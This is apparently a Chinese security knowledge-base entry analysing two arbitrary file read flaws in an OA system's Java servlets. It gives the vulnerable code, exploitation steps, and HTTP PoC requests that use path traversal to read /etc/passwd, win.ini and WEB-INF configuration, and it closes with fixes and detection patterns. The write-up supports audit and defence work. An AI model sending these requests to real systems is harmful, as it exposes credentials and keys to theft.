---
id: web-generic-file-inclusion-oa-logfiledownload-createfwfromjoa-arbitrary-read
title: OA 下载/转发 Servlet 直接 new File/FileInputStream，file 与 dir 参数任意文件读取
type: scenario
domain: web
path: web/generic/file-inclusion
technique: oa-servlet-param-file-stream-arbitrary-read
tags:
- java
- servlet
- arbitrary-file-read
- path-traversal
- fileinputstream
- randomaccessfile
- oa
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V59
  verified_at: '2026-11-05T09:12:39+08:00'
  notes: 已对照原文与54张图核对：图32/34 基类 AbstractFileDownloadServlet.getFile 取 url 参数并 new File；图36-37 LogFileDownloadServlet 重写 getFile，取 file 参数、http 分支 replace+getRealPath、else 导出根目录+fileurl，无规范化；图33-35 RandomAccessFile 分块读并写响应；图38 CreatefwfromjoaServlet.doPost 取 dir 直接 new FileInputStream 回显；图39 servlet 映射存在。两处任意文件读取链与原文一致。未验证点：PoC 未在真实目标执行，导出根目录层级需按部署调整；原文无产品名/版本/CVE，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-oa-logfiledownload-createfwfromjoa-arbitrary-read/
draft: false
kb_aliases:
- LogFileDownloadServlet 任意文件读取
- CreatefwfromjoaServlet 任意文件读取
- AbstractFileDownloadServlet 文件读取
- file 参数路径穿越
- dir 参数 FileInputStream
- OA 任意文件下载
---

## 一句话结论

OA 的两个独立 Servlet 都把请求参数直接变成文件路径：`LogFileDownloadServlet`（继承 `AbstractFileDownloadServlet`）用 `file` 参数拼到导出根目录后 `new File`/`RandomAccessFile` 下载，`CreatefwfromjoaServlet` 用 `dir` 参数直接 `new FileInputStream` 读文件并回显；两处都没有路径规范化或根目录约束，可用 `../` 或绝对路径读取任意文件。

## 原理

- **第一处：下载 Servlet 的基类与子类**
  - `AbstractFileDownloadServlet.doGet`：
    ```java
    file = this.getFile(req);
    String filename = file.getName();
    out = resp.getOutputStream();
    raf = new RandomAccessFile(file, "r");
    this.putFile(file, raf);   // 按 Range 分块 read 并 write 到响应
    ```
    基类 `getFile` 取 `req.getParameter("url")`，`decodeURL` 后直接 `new File(fileurl)`。
  - `LogFileDownloadServlet` 重写 `getFile`，改用 `file` 参数：
    ```java
    String fileurl = this.decodeURL(req.getParameter("file"));
    String scheme = URI.create(fileurl).getScheme();
    if (scheme != null && scheme.equals("http")) {
        fileurl = fileurl.replace(JAFWebUtil.getWebAppUrl(req), "");
        fileurl = this.getServletContext().getRealPath(fileurl);
    } else {
        URI output = TabelExportUtil.getOutputPath(LogManageService.EXPORTROOTDIR, true);
        scheme = output.getScheme();
        fileurl = scheme.equals("file")
            ? output.getSchemeSpecificPart() + fileurl
            : output.toString() + fileurl;
    }
    File file = new File(fileurl);
    ```
    非 HTTP 输入时，文件路径 = 导出根目录 + 用户输入。用户输入中的 `../` 不会被归一化，直接跳出导出目录；HTTP 输入时则先剥离应用 URL 再 `getRealPath`，同样可被路径片段影响。
  - `putFile` 用 `RandomAccessFile.read` 按 8192 字节循环写响应，支持 `Range` 头，读取大文件也方便。
  - Servlet 映射：`LogFileDownloadServlet` 有独立的 `<servlet-mapping>`，可直接请求。
- **第二处：`CreatefwfromjoaServlet.doPost`**
  ```java
  String filedir = request.getParameter("dir");
  File fitem = new File(filedir);
  FileInputStream fin = new FileInputStream(fitem);
  byte[] fjbyte = new byte[4096];
  ServletOutputStream resout = response.getOutputStream();
  int fjflg = fin.read(fjbyte);
  while (fjflg > 0) {
      resout.write(fjbyte, 0, fjflg);
      fjflg = fin.read(fjbyte);
  }
  ```
  `dir` 直接作为绝对/相对路径传给 `FileInputStream`，没有前缀、白名单或 `getCanonicalPath()` 校验；Servlet 映射为 `/.../CreatefwfromjoaServlet/*`。
- **为什么成立**：`java.io.File` 与 `FileInputStream`/`RandomAccessFile` 本身不限制 `..`、绝对路径或符号链接；只要应用进程有读权限，就能读取。两个入口都没有对最终路径做规范化后“是否仍在允许目录内”的判断。
- **影响**：读取 `WEB-INF/web.xml`、`WEB-INF/classes` 下的配置文件、数据库连接串、密钥/证书、系统文件（`/etc/passwd`、`C:\Windows\win.ini` 等），为后续伪造令牌、数据库连接或进一步利用提供材料。

## 触发条件

- 目标为使用该 OA 代码库的应用，存在 `LogFileDownloadServlet` 与 `CreatefwfromjoaServlet` 路由。
- 两个接口无需登录或可经鉴权绕过（`CreatefwfromjoaServlet.doPost` 自身没有登录检查；下载 Servlet 取决于外层 Filter）。
- 应用进程对目标文件有读权限。
- 目标未对 `file`/`dir`/`url` 参数做路径白名单或 WAF 拦截。

## 利用步骤

1. 先请求 `LogFileDownloadServlet`，用相对路径测试：`file=../../../../../../../../etc/passwd`；确认响应出现文件内容而不是错误页。
2. 若目标为 Windows，改用 `file=..\..\..\..\windows\win.ini` 或 `file=C:\Windows\win.ini`（按前缀拼接方式调整）。
3. 读取应用自身配置：`file=../../WEB-INF/web.xml`、`file=../../WEB-INF/classes/config/*.xml` 等，按导出根目录的层级调整 `../` 数量。
4. 请求 `CreatefwfromjoaServlet`，POST `dir=/etc/passwd` 或 `dir=C:\Windows\win.ini`，确认直接回显。
5. 保存响应作为证据；不要修改或删除目标文件（注意同目录的删除卡，某些下载请求会触发删除副作用）。

## PoC

第一处（下载 Servlet）：

```http
GET /xxx/xxx/LogFileDownloadServlet?file=../../../../../../../../etc/passwd HTTP/1.1
Host: target-ip
```

第二处（转发 Servlet）：

```http
POST /xxxx/CreatefwfromjoaServlet/ HTTP/1.1
Host: target-ip
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

dir=/etc/passwd
```

说明：`LogFileDownloadServlet` 的实际前缀是导出根目录，`../` 数量按目标部署调整；`CreatefwfromjoaServlet` 支持绝对路径，也可用相对路径从 Tomcat 工作目录向上跳。PoC 依据代码路径构造，未在真实目标执行。

## 变体与关联

- **基类 `url` 参数**：若其他 Servlet 直接继承 `AbstractFileDownloadServlet` 且未重写 `getFile`，则 `url` 参数也是任意文件读取入口，路径为 `decodeURL(url)` 后的原始值。
- **HTTP 分支**：`LogFileDownloadServlet` 对带 `http` scheme 的输入会执行 `replace(getWebAppUrl(req), "")` 再 `getRealPath`；若目标返回的是远程 URL 内容，还可能形成 SSRF/远程文件读取的组合，需按实际代码确认。
- **Windows/Linux**：Windows 同时接受 `\` 与 `/`；Linux 注意绝对路径与相对路径前缀差异。
- 关联：[[web-generic-file-inclusion-oa-getfile-mappingaddress]]（另一类 OA 的 `getfile.jsp`/`mappingAddress` 参数直入 `FileInputStream`）；[[web-java-framework-ruoyi-download-resource-path-traversal]]（下载接口路径穿越的通用形态）；[[web-java-oa-download-servlet-followup-delete-arbitrary-file]]（同一下载 Servlet 的读取后删除副作用）。

## 检测与防御

- **代码修复**：`file`/`dir`/`url` 参数只允许相对文件名，先 `Paths.get(base, name).normalize()`，再校验 `startsWith(baseCanonical)`；拒绝绝对路径、`..`、反斜杠与控制字符；对 `getRealPath` 结果同样做根目录校验。
- **鉴权**：`CreatefwfromjoaServlet` 增加登录与权限校验；下载 Servlet 统一接入鉴权 Filter，并避免只依赖模糊路径匹配。
- **检测特征**：参数含 `../`、`..\`、`/etc/`、`C:\`、`WEB-INF`、`win.ini`；下载接口返回非媒体/非文档内容；同一 IP 枚举多个系统文件；响应头/内容类型与文件名后缀不符。
- **应急**：审计访问日志确认读取过哪些文件；轮换被读取配置文件中的密钥与数据库凭据；修复后回归正常附件下载。
